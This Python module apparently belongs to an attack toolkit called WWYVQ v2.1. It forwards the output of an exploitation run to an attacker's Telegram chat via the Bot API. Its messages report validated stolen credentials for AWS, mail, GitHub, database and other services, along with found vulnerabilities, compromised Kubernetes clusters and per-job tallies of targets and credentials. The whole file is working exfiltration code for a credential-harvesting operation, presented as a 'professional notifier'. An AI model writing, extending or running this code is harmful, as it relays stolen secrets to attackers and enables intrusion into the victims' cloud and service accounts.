#!/usr/bin/env python3
"""
WWYVQ v2.1 Telegram Notifier Module
Professional Telegram notifications for valid credentials only

Author: wKayaa
Date: 2025-01-07
"""

import asyncio
import json
from typing import Dict, List, Any, Optional
from datetime import datetime
import re

from .base_notifier import BaseNotifierModule, NotificationMessage, NotificationResult, NotificationLevel


class TelegramNotifierModule(BaseNotifierModule):
    """
    Professional Telegram notification module
    Sends only valid credentials with professional formatting
    """
    
    def __init__(self):
        super().__init__(
            name="TelegramNotifier",
            description="Professional Telegram notifications for valid credentials"
        )
        
        # Telegram configuration
        self.bot_token = None
        self.chat_id = None
        self.valid_credentials_only = True
        self.professional_format = True
        
        # Rate limiting for Telegram API
        self.rate_limit_delay = 1.0  # 1 second between messages
        
        # Message formatting
        self.max_message_length = 4096  # Telegram limit
        
        # Emoji mapping
        self.service_emojis = {
            'aws': '☁️',
            'sendgrid': '📧',
            'mailgun': '📮',
            'smtp': '📬',
            'twilio': '📞',
            'github': '🐙',
            'slack': '💬',
            'discord': '🎮',
            'database': '🗄️',
            'kubernetes': '☸️',
            'docker': '🐳',
            'jwt': '🔑',
            'api': '🔌',
            'unknown': '❓'
        }
    
    async def execute_async(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Telegram notifications asynchronously"""
        try:
            notifications_sent = 0
            
            # Get validation results from context
            if 'results' in context and 'validation' in context['results']:
                validation_results = context['results']['validation']
                valid_credentials = validation_results.get('valid_credentials', [])
                
                # Send notifications for valid credentials only
                if self.valid_credentials_only:
                    for credential in valid_credentials:
                        notification = self.create_credential_notification(credential, 
                                                                         credential.get('source', 'unknown'))
                        result = await self.send_notification(notification)
                        if result.success:
                            notifications_sent += 1
                
                # Send vulnerabilities if any
                if 'exploitation' in context['results']:
                    exploitation_results = context['results']['exploitation']
                    vulnerabilities = exploitation_results.get('vulnerabilities', [])
                    
                    for vulnerability in vulnerabilities[:5]:  # Limit to 5 vulnerabilities
                        notification = self.create_vulnerability_notification(vulnerability, 
                                                                            context.get('target', 'unknown'))
                        result = await self.send_notification(notification)
                        if result.success:
                            notifications_sent += 1
            
            # Send job summary
            if context.get('job_id'):
                summary = self._create_job_summary(context)
                summary_notification = self.create_summary_notification(summary)
                result = await self.send_notification(summary_notification)
                if result.success:
                    notifications_sent += 1
            
            return {
                'notifications_sent': notifications_sent,
                'telegram_stats': self.get_stats()
            }
            
        except Exception as e:
            self.logger.error(f"❌ Telegram notification execution failed: {e}")
            return {'error': str(e)}
    
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Telegram notifications synchronously"""
        return asyncio.run(self.execute_async(context))
    
    async def _send_notification_impl(self, notification: NotificationMessage) -> NotificationResult:
        """Implementation of Telegram notification sending"""
        try:
            if not self.bot_token or not self.chat_id:
                return NotificationResult(
                    success=False,
                    error_message="Telegram bot token or chat ID not configured"
                )
            
            # Format message for Telegram
            formatted_message = self._format_telegram_message(notification)
            
            # Send via Telegram API
            message_id = await self._send_telegram_message(formatted_message)
            
            if message_id:
                return NotificationResult(
                    success=True,
                    message_id=str(message_id)
                )
            else:
                return NotificationResult(
                    success=False,
                    error_message="Failed to send Telegram message"
                )
                
        except Exception as e:
            self.logger.error(f"❌ Error sending Telegram notification: {e}")
            return NotificationResult(
                success=False,
                error_message=str(e)
            )
    
    async def _send_telegram_message(self, message: str) -> Optional[int]:
        """Send message via Telegram Bot API"""
        try:
            import aiohttp
            
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'disable_web_page_preview': True
            }
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.post(url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()
                        if result.get('ok'):
                            return result.get('result', {}).get('message_id')
                        else:
                            self.logger.error(f"❌ Telegram API error: {result.get('description')}")
                            return None
                    else:
                        self.logger.error(f"❌ Telegram API HTTP error: {response.status}")
                        return None
        
        except Exception as e:
            self.logger.error(f"❌ Error calling Telegram API: {e}")
            return None
    
    def _format_telegram_message(self, notification: NotificationMessage) -> str:
        """Format message for Telegram with professional styling"""
        try:
            if not self.professional_format:
                return self.format_message(notification)
            
            # Professional Telegram formatting
            level_emojis = {
                NotificationLevel.INFO: "ℹ️",
                NotificationLevel.SUCCESS: "🎯",
                NotificationLevel.WARNING: "⚠️",
                NotificationLevel.ERROR: "❌",
                NotificationLevel.CRITICAL: "🚨"
            }
            
            emoji = level_emojis.get(notification.level, "📢")
            timestamp = notification.timestamp.strftime("%Y-%m-%d %H:%M:%S UTC")
            
            # Special formatting for different notification types
            if 'credential' in notification.metadata.get('notification_type', ''):
                return self._format_credential_message(notification)
            elif 'vulnerability' in notification.metadata.get('notification_type', ''):
                return self._format_vulnerability_message(notification)
            elif 'cluster' in notification.metadata.get('notification_type', ''):
                return self._format_cluster_message(notification)
            elif 'summary' in notification.metadata.get('notification_type', ''):
                return self._format_summary_message(notification)
            else:
                # Generic formatting
                message = f"{emoji} *{self._escape_markdown(notification.title)}*\n"
                message += f"🕐 `{timestamp}`\n\n"
                message += self._escape_markdown(notification.message)
                
                return self._truncate_message(message)
        
        except Exception as e:
            self.logger.error(f"❌ Error formatting Telegram message: {e}")
            return f"❌ Formatting error: {str(e)}"
    
    def _format_credential_message(self, notification: NotificationMessage) -> str:
        """Format credential notification for Telegram"""
        credential = notification.data
        credential_type = credential.get('type', 'unknown')
        service = self._extract_service_from_type(credential_type)
        service_emoji = self.service_emojis.get(service, self.service_emojis['unknown'])
        
        message = f"🎯 *VALID CREDENTIAL FOUND*\n\n"
        message += f"{service_emoji} *Service:* `{service.upper()}`\n"
        message += f"🔑 *Type:* `{credential_type}`\n"
        message += f"🎯 *Target:* `{notification.metadata.get('target', 'unknown')}`\n"
        message += f"📊 *Confidence:* `{credential.get('confidence', 0):.1f}%`\n"
        
        # Add service-specific information
        if 'service_info' in credential:
            service_info = credential['service_info']
            if service_info:
                message += f"\n*Service Details:*\n"
                for key, value in service_info.items():
                    if key != 'service':  # Already shown
                        message += f"• {key.replace('_', ' ').title()}: `{value}`\n"
        
        # Add validation details if available
        if 'details' in credential and credential['details']:
            message += f"\n*Validation:* ✅ Real-time verified\n"
        
        message += f"\n🕐 `{notification.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}`"
        message += f"\n\n🔥 *WWYVQ v2.1 - wKayaa*"
        
        return self._truncate_message(message)
    
    def _format_vulnerability_message(self, notification: NotificationMessage) -> str:
        """Format vulnerability notification for Telegram"""
        vulnerability = notification.data.get('vulnerability', 'unknown')
        target = notification.metadata.get('target', 'unknown')
        
        message = f"⚠️ *VULNERABILITY DETECTED*\n\n"
        message += f"🔓 *Issue:* `{vulnerability}`\n"
        message += f"🎯 *Target:* `{target}`\n"
        message += f"🕐 `{notification.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}`"
        message += f"\n\n🔥 *WWYVQ v2.1 - wKayaa*"
        
        return self._truncate_message(message)
    
    def _format_cluster_message(self, notification: NotificationMessage) -> str:
        """Format cluster compromise notification for Telegram"""
        cluster_info = notification.data
        
        message = f"🚨 *KUBERNETES CLUSTER COMPROMISED*\n\n"
        message += f"☸️ *Cluster:* `{cluster_info.get('url', 'unknown')}`\n"
        message += f"🔍 *Services Found:* `{cluster_info.get('services_found', 0)}`\n"
        message += f"🔑 *Credentials:* `{len(cluster_info.get('credentials', []))}`\n"
        message += f"🔓 *Vulnerabilities:* `{len(cluster_info.get('vulnerabilities', []))}`\n"
        message += f"🕐 `{notification.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}`"
        message += f"\n\n🔥 *WWYVQ v2.1 - wKayaa*"
        
        return self._truncate_message(message)
    
    def _format_summary_message(self, notification: NotificationMessage) -> str:
        """Format job summary notification for Telegram"""
        summary = notification.data
        
        message = f"📊 *WWYVQ JOB SUMMARY*\n\n"
        message += f"🎯 *Targets Processed:* `{summary.get('targets_processed', 0)}`\n"
        message += f"☸️ *Clusters Found:* `{summary.get('clusters_found', 0)}`\n"
        message += f"🔑 *Credentials Found:* `{summary.get('credentials_found', 0)}`\n"
        message += f"✅ *Valid Credentials:* `{summary.get('valid_credentials', 0)}`\n"
        
        if 'duration' in summary:
            message += f"⏱️ *Duration:* `{summary['duration']}`\n"
        
        if 'job_id' in summary:
            message += f"🆔 *Job ID:* `{summary['job_id']}`\n"
        
        message += f"🕐 `{notification.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}`"
        message += f"\n\n🔥 *WWYVQ v2.1 - wKayaa*"
        
        return self._truncate_message(message)
    
    def _extract_service_from_type(self, credential_type: str) -> str:
        """Extract service name from credential type"""
        if credential_type.startswith('aws_'):
            return 'aws'
        elif credential_type.startswith('sendgrid_'):
            return 'sendgrid'
        elif credential_type.startswith('mailgun_'):
            return 'mailgun'
        elif credential_type.startswith('smtp_'):
            return 'smtp'
        elif credential_type.startswith('twilio_'):
            return 'twilio'
        elif credential_type.startswith('github_'):
            return 'github'
        elif credential_type.startswith('slack_'):
            return 'slack'
        elif credential_type.startswith('discord_'):
            return 'discord'
        elif credential_type.startswith('database_'):
            return 'database'
        elif credential_type.startswith('kubernetes_'):
            return 'kubernetes'
        elif credential_type.startswith('docker_'):
            return 'docker'
        elif credential_type.startswith('jwt_'):
            return 'jwt'
        elif 'api' in credential_type:
            return 'api'
        else:
            return 'unknown'
    
    def _escape_markdown(self, text: str) -> str:
        """Escape Markdown special characters for Telegram"""
        # Escape special Markdown characters
        special_chars = ['*', '_', '`', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
        escaped_text = text
        for char in special_chars:
            escaped_text = escaped_text.replace(char, f'\\{char}')
        return escaped_text
    
    def _truncate_message(self, message: str) -> str:
        """Truncate message to fit Telegram limits"""
        if len(message) <= self.max_message_length:
            return message
        
        # Truncate and add indicator
        truncated = message[:self.max_message_length - 50]
        truncated += "\n\n... (message truncated)"
        return truncated
    
    def _create_job_summary(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Create job summary from context"""
        summary = {
            'job_id': context.get('job_id', 'unknown'),
            'targets_processed': 0,
            'clusters_found': 0,
            'credentials_found': 0,
            'valid_credentials': 0,
            'start_time': context.get('start_time', datetime.utcnow()).isoformat()
        }
        
        # Extract data from results
        if 'results' in context:
            results = context['results']
            
            if 'exploitation' in results:
                exploitation = results['exploitation']
                summary['targets_processed'] = exploitation.get('targets_processed', 0)
                summary['clusters_found'] = exploitation.get('clusters_found', 0)
                summary['credentials_found'] = exploitation.get('credentials_found', 0)
            
            if 'validation' in results:
                validation = results['validation']
                summary['valid_credentials'] = len(validation.get('valid_credentials', []))
        
        # Calculate duration
        if 'start_time' in context:
            start_time = context['start_time']
            if isinstance(start_time, str):
                start_time = datetime.fromisoformat(start_time.replace('Z', '+00:00'))
            
            duration = datetime.utcnow() - start_time
            hours, remainder = divmod(duration.total_seconds(), 3600)
            minutes, seconds = divmod(remainder, 60)
            
            if hours > 0:
                summary['duration'] = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
            elif minutes > 0:
                summary['duration'] = f"{int(minutes)}m {int(seconds)}s"
            else:
                summary['duration'] = f"{int(seconds)}s"
        
        return summary
    
    async def _initialize_impl(self, config: Dict[str, Any]) -> None:
        """Initialize Telegram configuration"""
        self.bot_token = config.get('telegram_token', '')
        self.chat_id = config.get('telegram_chat_id', '')
        self.valid_credentials_only = config.get('valid_credentials_only', True)
        self.professional_format = config.get('professional_format', True)
        self.rate_limit_delay = config.get('rate_limit_delay', 1.0)
        
        # Validate configuration
        if not self.bot_token:
            raise ValueError("Telegram bot token is required")
        if not self.chat_id:
            raise ValueError("Telegram chat ID is required")
        
        # Test connection
        await self._test_telegram_connection()
    
    async def _test_telegram_connection(self) -> bool:
        """Test Telegram bot connection"""
        try:
            import aiohttp
            
            url = f"https://api.telegram.org/bot{self.bot_token}/getMe"
            
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        result = await response.json()
                        if result.get('ok'):
                            bot_info = result.get('result', {})
                            self.logger.info(f"✅ Telegram bot connected: {bot_info.get('username', 'unknown')}")
                            return True
                        else:
                            self.logger.error(f"❌ Telegram bot test failed: {result.get('description')}")
                            return False
                    else:
                        self.logger.error(f"❌ Telegram API HTTP error: {response.status}")
                        return False
        
        except Exception as e:
            self.logger.error(f"❌ Telegram connection test failed: {e}")
            return False
    
    def supports_level(self, level: NotificationLevel) -> bool:
        """Check if module supports this notification level"""
        # Only send success and critical notifications for valid credentials
        if self.valid_credentials_only:
            return level in [NotificationLevel.SUCCESS, NotificationLevel.CRITICAL, NotificationLevel.INFO]
        return True
    
    def create_credential_notification(self, credential: Dict[str, Any], target: str) -> NotificationMessage:
        """Create notification for found credential"""
        return NotificationMessage(
            title="🎯 Valid Credential Found",
            message="Professional credential notification",
            level=NotificationLevel.SUCCESS,
            data=credential,
            metadata={
                'target': target, 
                'credential_type': credential.get('type'),
                'notification_type': 'credential'
            }
        )